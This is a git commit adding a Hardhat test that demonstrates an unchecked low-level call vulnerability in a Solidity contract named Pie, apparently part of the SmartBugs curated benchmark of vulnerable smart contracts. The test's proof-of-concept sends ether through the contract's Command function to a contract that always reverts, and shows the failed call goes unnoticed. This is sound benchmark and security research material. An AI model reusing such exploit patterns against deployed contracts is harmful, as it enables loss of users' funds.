f45e64289c254aec630f2309f7ee11ef910014ac
Monica Jin <monicachenjin@gmail.com>
2024-09-10 14:39:53 +0200

    add Pir exploit

---
+++ smartbugs-curated/0.4.x/test/unchecked_low_level_calls/0xd2018bfaa266a9ec0a1a84b061640faa009def76_test.js
@@ -0,0 +1,36 @@
+const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
+const { expect } = require('chai');
+
+describe("attack unchecked_low_level_calls/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol", function () {
+
+  let onwer;
+
+  async function deployContracts() {
+    [owner] = await ethers.getSigners();
+    const Pie = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol:Pie");
+    const contract = await Pie.connect(owner).deploy();
+
+    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
+    const revertContract = await RevertContract.deploy();
+
+    return {contract, revertContract}
+  };
+
+  it("exploit unchecked low level call vulnerability", async function () {
+    const {contract, revertContract} = await loadFixture(deployContracts);
+    const amount = ethers.parseEther("1");
+    await expect(
+      owner.sendTransaction({
+        to: revertContract.target,
+        value: amount,
+      })
+    ).to.be.revertedWith("I always revert!");
+
+    await expect(contract.connect(owner).Command(revertContract.target, "0x", {value: amount})).to.not.be.reverted;
+
+    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(amount);
+
+    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);
+
+  });
+});
